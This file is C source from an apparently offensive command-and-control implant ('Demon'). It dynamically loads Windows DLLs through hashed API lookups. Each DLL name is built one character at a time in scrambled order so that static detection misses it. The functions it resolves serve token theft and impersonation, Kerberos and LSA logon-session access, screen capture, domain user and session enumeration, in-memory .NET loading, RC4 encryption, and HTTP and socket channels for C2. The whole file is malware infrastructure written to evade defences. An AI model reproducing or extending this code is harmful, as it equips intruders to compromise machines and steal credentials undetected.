#include <Demon.h>
#include <Core/Runtime.h>


BOOL RtAdvapi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = 'A';
    ModuleName[ 2  ] = 'V';
    ModuleName[ 11 ] = 'L';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 3  ] = 'A';
    ModuleName[ 8  ] = '.';
    ModuleName[ 12 ] = 0;
    ModuleName[ 6  ] = '3';
    ModuleName[ 7  ] = '2';
    ModuleName[ 1  ] = 'D';
    ModuleName[ 9  ] = 'D';
    ModuleName[ 5  ] = 'I';
    ModuleName[ 4  ] = 'P';

    if ( ( Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.GetTokenInformation          = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
        Instance.Win32.CreateProcessWithTokenW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
        Instance.Win32.CreateProcessWithLogonW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
        Instance.Win32.RevertToSelf                 = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_REVERTTOSELF );
        Instance.Win32.GetUserNameA                 = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETUSERNAMEA );
        Instance.Win32.LogonUserW                   = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOGONUSERW );
        Instance.Win32.LookupPrivilegeValueA        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGEVALUEA );
        Instance.Win32.LookupAccountSidA            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDA );
        Instance.Win32.LookupAccountSidW            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
        Instance.Win32.OpenThreadToken              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
        Instance.Win32.OpenProcessToken             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
        Instance.Win32.AdjustTokenPrivileges        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
        Instance.Win32.LookupPrivilegeNameA         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
        Instance.Win32.SystemFunction032            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
        Instance.Win32.FreeSid                      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_FREESID );
        Instance.Win32.SetSecurityDescriptorSacl    = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
        Instance.Win32.SetSecurityDescriptorDacl    = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
        Instance.Win32.InitializeSecurityDescriptor = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_INITIALIZESECURITYDESCRIPTOR );
        Instance.Win32.AddMandatoryAce              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADDMANDATORYACE );
        Instance.Win32.InitializeAcl                = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_INITIALIZEACL );
        Instance.Win32.AllocateAndInitializeSid     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ALLOCATEANDINITIALIZESID );
        Instance.Win32.CheckTokenMembership         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CHECKTOKENMEMBERSHIP );
        Instance.Win32.SetEntriesInAclW             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETENTRIESINACLW );
        Instance.Win32.SetThreadToken               = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETTHREADTOKEN );
        Instance.Win32.LsaNtStatusToWinError        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
        Instance.Win32.EqualSid                     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_EQUALSID );
        Instance.Win32.ConvertSidToStringSidW       = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
        Instance.Win32.GetSidSubAuthorityCount      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
        Instance.Win32.GetSidSubAuthority           = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );

        PUTS( "Loaded Advapi32 functions" )
    } else {
        PUTS( "Failed to load Advapi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMscoree(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 1  ] = 'S';
    ModuleName[ 2  ] = 'C';
    ModuleName[ 11 ] = 0;
    ModuleName[ 0  ] = 'M';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 8  ] = 'D';
    ModuleName[ 7  ] = '.';
    ModuleName[ 9  ] = 'L';
    ModuleName[ 5  ] = 'E';
    ModuleName[ 4  ] = 'R';
    ModuleName[ 6  ] = 'E';
    ModuleName[ 3  ] = 'O';

    if ( ( Instance.Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );

        PUTS( "Loaded Mscoree functions" )
    } else {
        PUTS( "Failed to load Mscoree" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtOleaut32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 3  ] = 'A';
    ModuleName[ 2  ] = 'E';
    ModuleName[ 0  ] = 'O';
    ModuleName[ 1  ] = 'L';
    ModuleName[ 5  ] = 'T';
    ModuleName[ 11 ] = 'L';
    ModuleName[ 7  ] = '2';
    ModuleName[ 6  ] = '3';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 12 ] = 0;
    ModuleName[ 4  ] = 'U';
    ModuleName[ 9  ] = 'D';
    ModuleName[ 8  ] = '.';

    if ( ( Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.SafeArrayAccessData   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
        Instance.Win32.SafeArrayUnaccessData = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
        Instance.Win32.SafeArrayCreate       = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
        Instance.Win32.SafeArrayPutElement   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYPUTELEMENT );
        Instance.Win32.SafeArrayCreateVector = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATEVECTOR );
        Instance.Win32.SafeArrayDestroy      = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
        Instance.Win32.SysAllocString        = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );

        PUTS( "Loaded Oleaut32 functions" )
    } else {
        PUTS( "Failed to load Oleaut32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtUser32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 1  ] = 'S';
    ModuleName[ 0  ] = 'U';
    ModuleName[ 10 ] = 0;
    ModuleName[ 6  ] = '.';
    ModuleName[ 8  ] = 'L';
    ModuleName[ 7  ] = 'D';
    ModuleName[ 5  ] = '2';
    ModuleName[ 3  ] = 'R';
    ModuleName[ 9  ] = 'L';
    ModuleName[ 2  ] = 'E';
    ModuleName[ 4  ] = '3';
    if ( ( Instance.Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.ShowWindow       = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_SHOWWINDOW );
        Instance.Win32.GetSystemMetrics = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETSYSTEMMETRICS );
        Instance.Win32.GetDC            = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETDC );
        Instance.Win32.ReleaseDC        = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_RELEASEDC );

        PUTS( "Loaded User32 functions" )
    } else {
        PUTS( "Failed to load User32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtShell32(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = 'S';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 7  ] = '.';
    ModuleName[ 6  ] = '2';
    ModuleName[ 8  ] = 'D';
    ModuleName[ 4  ] = 'L';
    ModuleName[ 1  ] = 'H';
    ModuleName[ 11 ] = 0;
    ModuleName[ 9  ] = 'L';
    ModuleName[ 5  ] = '3';
    ModuleName[ 3  ] = 'L';
    ModuleName[ 2  ] = 'E';
    if ( ( Instance.Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.CommandLineToArgvW = LdrFunctionAddr( Instance.Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );

        PUTS( "Loaded Shell32 functions" )
    } else {
        PUTS( "Failed to load Shell32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMsvcrt(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = 'M';
    ModuleName[ 6  ] = '.';
    ModuleName[ 10 ] = 0;
    ModuleName[ 9  ] = 'L';
    ModuleName[ 4  ] = 'R';
    ModuleName[ 2  ] = 'V';
    ModuleName[ 8  ] = 'L';
    ModuleName[ 7  ] = 'D';
    ModuleName[ 3  ] = 'C';
    ModuleName[ 5  ] = 'T';
    ModuleName[ 1  ] = 'S';

    if ( ( Instance.Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.vsnprintf = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );

        PUTS( "Loaded Msvcrt functions" )
    } else {
        PUTS( "Failed to load Msvcrt" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtIphlpapi(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 8  ] = '.';
    ModuleName[ 0  ] = 'I';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 2  ] = 'H';
    ModuleName[ 9  ] = 'D';
    ModuleName[ 6  ] = 'P';
    ModuleName[ 11 ] = 'L';
    ModuleName[ 1  ] = 'P';
    ModuleName[ 3  ] = 'L';
    ModuleName[ 12 ] = 0;
    ModuleName[ 5  ] = 'A';
    ModuleName[ 4  ] = 'P';
    ModuleName[ 7  ] = 'I';

    if ( ( Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );

        PUTS( "Loaded Iphlpapi functions" )
    } else {
        PUTS( "Failed to load Iphlpapi" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtGdi32(
    VOID
) {
    CHAR ModuleName[ 10 ] = { 0 };

    ModuleName[ 4 ] = '2';
    ModuleName[ 6 ] = 'D';
    ModuleName[ 5 ] = '.';
    ModuleName[ 8 ] = 'L';
    ModuleName[ 2 ] = 'I';
    ModuleName[ 1 ] = 'D';
    ModuleName[ 7 ] = 'L';
    ModuleName[ 9 ] = 0;
    ModuleName[ 0 ] = 'G';
    ModuleName[ 3 ] = '3';

    if ( ( Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.GetCurrentObject   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
        Instance.Win32.GetObjectW         = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETOBJECTW );
        Instance.Win32.CreateCompatibleDC = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
        Instance.Win32.CreateDIBSection   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATEDIBSECTION );
        Instance.Win32.SelectObject       = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_SELECTOBJECT );
        Instance.Win32.BitBlt             = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_BITBLT );
        Instance.Win32.DeleteObject       = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_DELETEOBJECT );
        Instance.Win32.DeleteDC           = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_DELETEDC );

        PUTS( "Loaded Gdi32 functions" )
    } else {
        PUTS( "Failed to load Gdi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtNetApi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = 'N';
    ModuleName[ 11 ] = 'L';
    ModuleName[ 8  ] = '.';
    ModuleName[ 9  ] = 'D';
    ModuleName[ 6  ] = '3';
    ModuleName[ 2  ] = 'T';
    ModuleName[ 3  ] = 'A';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 12 ] = 0;
    ModuleName[ 4  ] = 'P';
    ModuleName[ 5  ] = 'I';
    ModuleName[ 1  ] = 'E';
    ModuleName[ 7  ] = '2';

    if ( ( Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETGROUPENUM );
        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETUSERENUM );
        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETWKSTAUSERENUM );
        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETSESSIONENUM );
        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETSHAREENUM );
        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );

        PUTS( "Loaded NetApi32 functions" )
    } else {
        PUTS( "Failed to load NetApi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtWs2_32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = 'W';
    ModuleName[ 2  ] = '2';
    ModuleName[ 4  ] = '3';
    ModuleName[ 6  ] = '.';
    ModuleName[ 9  ] = 'L';
    ModuleName[ 1  ] = 'S';
    ModuleName[ 3  ] = '_';
    ModuleName[ 5  ] = '2';
    ModuleName[ 10 ] = 0;
    ModuleName[ 8  ] = 'L';
    ModuleName[ 7  ] = 'D';

    if ( ( Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.WSAStartup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASTARTUP );
        Instance.Win32.WSACleanup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSACLEANUP );
        Instance.Win32.WSASocketA      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASOCKETA );
        Instance.Win32.WSAGetLastError = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSAGETLASTERROR );
        Instance.Win32.ioctlsocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_IOCTLSOCKET );
        Instance.Win32.bind            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_BIND );
        Instance.Win32.listen          = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_LISTEN );
        Instance.Win32.accept          = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_ACCEPT );
        Instance.Win32.closesocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_CLOSESOCKET );
        Instance.Win32.recv            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_RECV );
        Instance.Win32.send            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_SEND );
        Instance.Win32.connect         = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_CONNECT );
        Instance.Win32.getaddrinfo     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_GETADDRINFO );
        Instance.Win32.freeaddrinfo    = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_FREEADDRINFO );

        PUTS( "Loaded Ws2_32 functions" )
    } else {
        PUTS( "Failed to load Ws2_32" )
        return FALSE;
    }

    return TRUE;
}


BOOL RtSspicli(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = 'S';
    ModuleName[ 11 ] = 0;
    ModuleName[ 9  ] = 'L';
    ModuleName[ 1  ] = 'S';
    ModuleName[ 6  ] = 'I';
    ModuleName[ 7  ] = '.';
    ModuleName[ 5  ] = 'L';
    ModuleName[ 8  ] = 'D';
    ModuleName[ 2  ] = 'P';
    ModuleName[ 10 ] = 'L';
    ModuleName[ 4  ] = 'C';
    ModuleName[ 3  ] = 'I';

    if ( ( Instance.Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
        Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
        Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
        Instance.Win32.LsaConnectUntrusted            = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACONNECTUNTRUSTED );
        Instance.Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAFREERETURNBUFFER );
        Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
        Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
        Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );

        PUTS( "Loaded Sspicli functions" )
    } else {
        PUTS( "Failed to load Sspicli" )
        return FALSE;
    }

    return TRUE;
}

#ifdef TRANSPORT_HTTP
BOOL RtWinHttp(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = 'W';
    ModuleName[ 2  ] = 'N';
    ModuleName[ 7  ] = '.';
    ModuleName[ 11 ] = 0;
    ModuleName[ 10 ] = 'L';
    ModuleName[ 4  ] = 'T';
    ModuleName[ 8  ] = 'D';
    ModuleName[ 1  ] = 'I';
    ModuleName[ 9  ] = 'L';
    ModuleName[ 6  ] = 'P';
    ModuleName[ 3  ] = 'H';
    ModuleName[ 5  ] = 'T';

    if ( ( Instance.Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
        Instance.Win32.WinHttpOpen              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
        Instance.Win32.WinHttpConnect           = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
        Instance.Win32.WinHttpOpenRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
        Instance.Win32.WinHttpSetOption         = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
        Instance.Win32.WinHttpCloseHandle       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
        Instance.Win32.WinHttpSendRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
        Instance.Win32.WinHttpAddRequestHeaders = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
        Instance.Win32.WinHttpReceiveResponse   = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
        Instance.Win32.WinHttpReadData          = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
        Instance.Win32.WinHttpQueryHeaders      = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );

        PUTS( "Loaded WinHttp functions" )
    } else {
        PUTS( "Failed to load WinHttp" )
        return FALSE;
    }

    return TRUE;
}
#endif